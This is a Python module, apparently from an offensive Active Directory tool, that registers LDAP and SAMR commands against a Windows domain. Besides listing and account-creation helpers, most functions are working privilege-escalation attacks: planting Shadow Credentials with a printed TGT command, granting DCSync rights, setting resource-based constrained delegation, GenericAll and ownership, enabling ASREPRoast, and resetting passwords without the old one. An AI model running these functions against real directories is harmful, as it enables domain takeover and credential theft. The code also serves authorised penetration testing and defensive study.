import ldap3
import random
import string
import types
import re
from .addcomputer import ADDCOMPUTER
from functools import wraps

from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
from ldap3.protocol.formatters.formatters import format_sid
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from impacket.ldap import ldaptypes
from impacket.dcerpc.v5 import samr, dtypes

from .exceptions import BloodyError, ResultError, NoResultError
from .utils import createACE, createEmptySD
from .utils import resolvDN, getDefaultNamingContext
from .utils import rpcChangePassword
from .utils import userAccountControl, modifySecDesc
from .utils import LOG


functions = []


def register_module(f):
    functions.append((f.__name__, f))

    @wraps(f)
    def wrapper(*args, **kwds):
        return f(*args, **kwds)

    return wrapper


@register_module
def getGroupMembers(conn, identity):
    """
    Return the list of member for a group whose identity is given as parameter
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
    """
    ldap_conn = conn.getLdapConnection()
    group_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(group_dn, '(objectClass=group)', attributes='member')
    members = ldap_conn.response[0]['attributes']['member']
    LOG.info(members)
    return members


@register_module
def getObjectAttributes(conn, identity):
    """
    Fetch LDAP attributes for the identity (group or user) provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(dn, '(objectClass=*)', attributes='*')
    attributes = ldap_conn.response[0]['attributes']
    LOG.info(attributes)
    return attributes

def getDefaultPasswordPolicy(conn):
    """
    """
    ldap_conn = conn.getLdapConnection()
    domain_dn = getDefaultNamingContext(ldap_conn)
    ldap_conn.search(domain_dn, '(objectClass=domain)', attributes='minPwdLength')
    attributes = ldap_conn.response[0]['attributes']
    LOG.info(attributes)
    return attributes



@register_module
def addUser(conn, sAMAccountName, password, ou=None):
    """
    Add a new user in the LDAP database
    By default the user object is put in the OU Users
    This can be changed with the ou parameter
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        password: the password that will be set for the user account
    """
    ldap_conn = conn.getLdapConnection()

    if ou:
        user_dn = f"cn={sAMAccountName},{ou}"
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"

    user_cls = ['top', 'person', 'organizationalPerson', 'user']
    attr = {'objectClass': user_cls}
    attr["distinguishedName"] = user_dn
    attr["sAMAccountName"] = sAMAccountName
    attr["userAccountControl"] = 544

    ldap_conn.add(user_dn, attributes=attr)

    if ldap_conn.result['description'] == 'success':
        changePassword(conn, sAMAccountName, password)
    else:
        LOG.error(sAMAccountName + ': ' + ldap_conn.result['description'])
        raise BloodyError(ldap_conn.result['description'])

@register_module
def addComputer(conn, hostname, password, ou=None):
    """
    Add a new computer in the AD database
    By default the computer object is put in the OU CN=Computers
    This can be changed with the ou parameter
    Args:
        hostname: computer name (without the trailing $ symbol)
        password: the password that will be set for the computer account
        ou: Optional parameters - Where to put the computer object in the LDAP directory
    """
    cnf = conn.conf
    if re.search('[a-zA-Z]', cnf.host):
        dc_host = cnf.host
        dc_ip = None
    else:
        dc_host = None
        dc_ip = cnf.host
    options = types.SimpleNamespace(
        hashes=f'{cnf.lmhash}:{cnf.nthash}' if cnf.nthash else None,
        aesKey=None, k=cnf.kerberos, kdc_host=None,
        dc_host=dc_host, dc_ip=dc_ip,
        computer_name=hostname, computer_pass=password,
        method='LDAPS' if cnf.scheme.lower() == 'ldaps' else 'SAMR',
        port=None, domain_netbios=None,
        no_add=None, delete=None, baseDN=None,
        computer_group=ou)
    ADDCOMPUTER(cnf.username, cnf.password, cnf.domain, options).run()


@register_module
def delObject(conn, identity):
    """
    Delete an object (user or group) from the Directory based on the identity provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    LOG.debug(f"Trying to remove {dn}")
    ldap_conn.delete(dn)
    LOG.info(f"[+] {dn} has been removed")


@register_module
def changePassword(conn, identity, new_pass):
    """
    Change the target password without knowing the old one using LDAPS or RPC
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new_pass: new password for the target
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    # If LDAPS is not supported use SAMR
    if conn.conf.scheme == "ldaps":
        modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
        if ldap_conn.result['result'] == 0:
            LOG.info('[+] Password changed successfully!')
        else:
            raise ResultError(ldap_conn.result)
    else:
        # Check if identity is sAMAccountName
        sAMAccountName = identity
        for marker in ["dc=", "s-1", "{"]:
            if marker in identity:
                ldap_filter = '(objectClass=*)'
                entries = ldap_conn.search(target_dn, ldap_filter, attributes=['SAMAccountName'])
                try:
                    sAMAccountName = entries[0]['sAMAccountName']
                except IndexError:
                    raise NoResultError(target_dn, ldap_filter)
                break

        rpcChangePassword(conn, sAMAccountName, new_pass)


@register_module
def addObjectToGroup(conn, member, group):
    """
    Add an object to a group
        member: the user or group to add into the group
        group: the group to add to
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    LOG.debug(f"[+] {member} found at {member_dn}")
    group_dn = resolvDN(ldap_conn, group)
    LOG.debug(f"[+] {group} found at {group_dn}")
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, member_dn, group_dn, raise_error=True)
    LOG.info(f"[+] Adding {member_dn} to {group_dn}")


@register_module
def addForeignObjectToGroup(conn, user_sid, group_dn):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args:
        foreign object sid
        group dn in which to add the foreign object
    """
    ldap_conn = conn.getLdapConnection()
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)


@register_module
def delObjectFromGroup(conn, member, group):
    """
    Remove member from group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    group_dn = resolvDN(ldap_conn, group)
    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)


@register_module
def getObjectsInOu(conn, base_ou, object_type='*'):
    """
    List the object present in an organisational unit
    base_ou: the ou to target
    object_type: the type of object to fetch (user/computer or * to have them all)
    """
    ldap_conn = conn.getLdapConnection()
    ldap_conn.search(base_ou, f'(objectClass={object_type})')
    res = [entry['dn'] for entry in ldap_conn.response if entry['type'] == 'searchResEntry']
    return res


@register_module
def getOusInOu(conn, base_ou):
    """
    List the user present in an organisational unit
    """
    containers = getObjectsInOu(conn, base_ou, "container")
    for container in containers:
        LOG.info(container)
    return containers


@register_module
def getUsersInOu(conn, base_ou):
    """
    List the user present in an organisational unit
    """
    users = getObjectsInOu(conn, base_ou, "user")
    for user in users:
        LOG.info(user)
    return users


@register_module
def getComputersInOu(conn, base_ou):
    """
    List the computers present in an organisational unit
    """
    computers = getObjectsInOu(conn, base_ou, "computer")
    for computer in computers:
        LOG.info(computer)
    return computers


@register_module
def addShadowCredentials(conn, identity, outfilePath=None):
    """
    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        outfilePath: file path for the generated certificate (default is current path)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    LOG.debug("Generating certificate")
    certificate = X509Certificate2(subject=identity, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    LOG.debug("Certificate generated")
    LOG.debug("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())

    ldap_conn.search(target_dn, '(objectClass=*)', attributes=['msDS-KeyCredentialLink'])

    new_values = ldap_conn.entries[0]['msDS-KeyCredentialLink'].raw_values + [keyCredential.toDNWithBinary().toString()]
    LOG.debug(new_values)
    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
    
    if ldap_conn.result['result'] == 0:
        LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
        if outfilePath is None:
            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
            LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
        else:
            path = outfilePath

        certificate.ExportPEM(path_to_files=path)
        LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
        LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
        LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
        LOG.info("Run the following command to obtain a TGT")
        LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', identity, path))

    else:
        raise ResultError(ldap_conn.result)


@register_module
def delShadowCredentials(conn, identity):
    """
    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    # TODO: remove only the public key corresponding to the certificate provided
    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
    if ldap_conn.result['result'] == 0:
        LOG.info("msDS-KeyCredentialLink attribute of the target object updated")
    else:
        raise ResultError(ldap_conn.result)


@register_module
def setGenericAll(conn, identity, target, enable="True"):
    """
    Give permission to an AD object to modify the properties of another object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object you control
        target:  sAMAccountName, GPO name, DN, GUID or SID
        enable: True to add GenericAll for the user or False to remove it (default is True)
    """
    modifySecDesc(conn=conn, identity=identity, target=target, enable=enable)
    if enable == "True":
        LOG.info(f'[+] {identity} can now write the attributes of {target}')


@register_module
def setOwner(conn, identity, target):
    """
    Set an AD object as the owner of the target object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object you control
        target: sAMAccountName, DN, GUID or SID of the targeted object (You must have WriteOwner permission on it)
    """
    old_sid = modifySecDesc(conn, identity=identity, target=target, control_flag=dtypes.OWNER_SECURITY_INFORMATION)['OwnerSid'].formatCanonical()
    LOG.info(f'[+] Old owner {old_sid} is now replaced by {identity} on {target}')
    return old_sid


@register_module
def setRbcd(conn, spn, target, enable="True"):
    """
    Set Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
    Args:
        spn: sAMAccountName, DN, GUID or SID of the SPN
        target: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
        enable: True to add Rbcd and False to remove it (default is True)
    """
    modifySecDesc(conn=conn, identity=spn, target=target, ldap_attribute='msDS-AllowedToActOnBehalfOfOtherIdentity', enable=enable)
    LOG.info('[+] Delegation rights modified successfully!')
    if enable == "True":
        LOG.info(f'{spn} can now impersonate users on {target} via S4U2Proxy')


@register_module
def setDCSync(conn, identity, enable='True'):
    """
    Set the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
        enable: True to add DCSync and False to remove it (default is True)
    """
    modifySecDesc(conn=conn, identity=identity, target=getDefaultNamingContext(conn.getLdapConnection()), ldap_filter='(objectCategory=domain)', enable=enable)
    if enable == 'True':
        LOG.info(f'{identity} can now DCSync')

        
@register_module
def setDontReqPreauthFlag(conn, identity, enable="True"):
    """
    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
    You must have a write permission on the UserAccountControl attribute of the target user
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        enable: True to enable DontReqPreAuth for the identity or False to disable it (default is True)
    """
    userAccountControl(conn, identity, enable, samr.UF_DONT_REQUIRE_PREAUTH)


@register_module
def setAccountDisableFlag(conn, identity, enable="False"):
    """
    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
    You must have write permission on the UserAccountControl attribute of the target
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        enable: True to enable the identity or False to disable it (default is False)
    """
    userAccountControl(conn, identity, enable, samr.UF_ACCOUNTDISABLE)